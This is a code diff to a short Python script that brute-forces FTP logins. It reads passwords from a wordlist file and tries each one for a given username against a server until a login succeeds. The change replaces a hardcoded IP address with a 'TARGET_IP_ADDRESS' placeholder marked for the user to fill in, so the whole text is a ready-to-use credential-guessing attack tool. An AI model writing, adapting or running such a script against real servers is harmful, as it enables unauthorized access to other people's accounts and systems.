@@ -9,7 +9,7 @@ def check(user,password):
     try:
         print(f"\nTrying {user}:{password} ...")
         ftp=ftplib.FTP()
-        if ftp.connect("192.168.29.21",21):
+        if ftp.connect("TARGET_IP_ADDRESS",21): #put your Target IP Address here
             ftp.login(user,password)
             print(f"Successlly Logged in: {user}:{password}")
         ftp.quit()
@@ -18,7 +18,7 @@ def check(user,password):
         return False
     
 user = input('Enter the username: ')
-passlist = open('pass.txt','r') # modify according to your wordlist
+passlist = open('pass.txt','r') #modify according to your wordlist
 for password in passlist:
     if check(user,password.rstrip()) == True:
         break
